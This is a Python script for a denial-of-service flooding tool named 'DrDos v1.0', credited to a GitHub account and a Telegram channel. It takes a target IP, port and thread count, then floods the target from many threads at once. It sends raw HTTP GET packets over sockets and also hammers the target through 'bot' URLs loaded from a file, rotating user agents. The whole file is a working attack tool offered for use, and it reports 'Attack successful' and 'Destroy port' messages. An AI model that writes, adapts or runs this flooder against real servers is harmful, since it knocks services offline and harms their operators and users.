#!/usr/bin/python3

from datetime import datetime
import socket
import sys, os
import threading
import time
import logging
import urllib.request
import random
from queue import Queue
from rich.console import Console
import argparse

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
console = Console()


def get_Typer():
    parser = argparse.ArgumentParser(description="Klar DDos", add_help=False)
    parser.add_argument("host", nargs="?", default=None, help="Server IP")
    parser.add_argument(
        "-p", "--port", type=int, dest="port", help="-p 80 default 80", default=80
    )
    parser.add_argument(
        "-t", "--t", type=int, dest="threads", help="default 125 -t 1", default=125
    )
    parser.add_argument(
        "-h", "--help", dest="help", action="store_true", help="help menu"
    )

    args = parser.parse_args()

    if args.help or not args.host:
        parser.print_help()
        sys.exit()

    logging.basicConfig(level=logging.INFO, format="%(levelname)-8s %(message)s")

    global host, port, thr, hides
    host = args.host
    port = args.port
    thr = args.threads


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(
                urllib.request.Request(
                    url, headers={"User-Agent": random.choice(uagent)}
                )
            )
            console.print(
                f"DrDos Bot is Attacking at {time.ctime(time.time())}", style="green"
            )
            time.sleep(0.1)
    except:
        time.sleep(0.1)


# DDOS 2 IN MASSEGS
def down_it(item):
    try:
        while True:
            packet = str(
                "GET / HTTP/1.1\nHost: "
                + host
                + "\n\n User-Agent: "
                + random.choice(uagent)
                + "\n"
                + data
            ).encode("utf-8")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                console.print(
                    f"Attack successful at {time.ctime(time.time())} ",
                    style="green",
                )
            else:
                s.shutdown(1)
                console.print(
                    f"Attack failed on port {port}",
                    style="bold red",
                )
            time.sleep(0.1)
    except socket.error as e:
        console.print(
            f"Server {host} is down or not responding",
            style="bold red",
        )
        # print("\033[91m",e,"\033[0m")
        time.sleep(0.1)


# DDOS IN MESSAGE
def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()


# Script Run
def run():
    console.print("\n-----------------\n", style="bold")
    console.print("DrDos v1.0", style="bold")
    console.print("By The [link https://github.com/DrDataYE]@DrDataYE", style="bold")
    console.print("Telegram [link https://t.me/LinuxArabe]Kali Linux", style="bold")
    console.print("By Yemen", style="bold")
    console.print("\n-----------------\n", style="bold")
    console.print(
        f"START_TIME: {datetime.now().strftime('%a %b %d %H:%M:%S %Y')}", style="bold"
    )
    console.print(f"Host: {host}", style="bold")
    console.print(f"Port: {port}", style="bold")
    console.print(f"Threads: {thr}", style="bold")
    console.print(
        f"OPTION: Destroy port {port} with {thr} threads for {host}", style="bold"
    )
    console.print("\n-----------------\n", style="bold")

    with console.status("[bold green]Wait, loading functions...") as status:
        headers()
        status.update("[bold green]Headers loaded, loading user agent...")
        user_agent()
        status.update("[bold green]User agent loaded, loading bots...")
        my_bots()
        status.update("[bold green]All functions loaded successfully!")

    start_time = time.time()  # Start time of the script

    try:
        with console.status(
            "[bold dark_orange]Finishing Attacks CTRL+C to stop....."
        ) as status:
            while True:
                for i in range(int(thr)):
                    t = threading.Thread(target=dos)
                    t.daemon = True  # if thread is exist, it dies
                    t.start()
                    t2 = threading.Thread(target=dos2)
                    t2.daemon = True  # if thread is exist, it dies
                    t2.start()

                # tasking
                item = 0
                while True:
                    if item > 1800:  # for no memory crash
                        item = 0
                        time.sleep(0.1)
                    item = item + 1
                    q.put(item)
                    w.put(item)
                q.join()
                w.join()
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        console.print("\n\nAttack stopped by user.", style="bold")
        console.print(f"Elapsed time: {elapsed_time:.2f} seconds", style="bold")


# تحديد المسار الأساسي بناءً على النظام
if "PREFIX" in os.environ:
    # مسار لـ Termux
    base_path = os.path.join(os.environ["PREFIX"], "usr/share/drdos")
else:
    # مسار لـ Linux
    base_path = "/usr/share/drdos"


def headers():
    time.sleep(1)
    global data
    file_path = os.path.join(base_path, "headers.txt")
    with open(file_path, "r") as r:
        data = r.read()


def user_agent():
    time.sleep(1)
    global uagent
    file_path = os.path.join(base_path, "useragents.txt")
    with open(file_path, "r") as r:
        uagent = [line.strip() for line in r]
    return uagent


def my_bots():
    time.sleep(1)
    global bots
    file_path = os.path.join(base_path, "bots.txt")
    with open(file_path, "r") as r:
        bots = [line.strip() for line in r]
    return bots


# task queue are q,w
q = Queue()
w = Queue()

if __name__ == "__main__":
    get_Typer()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        console.print("check server ip and port", style="bold dark_orange")
        sys.exit()

    run()
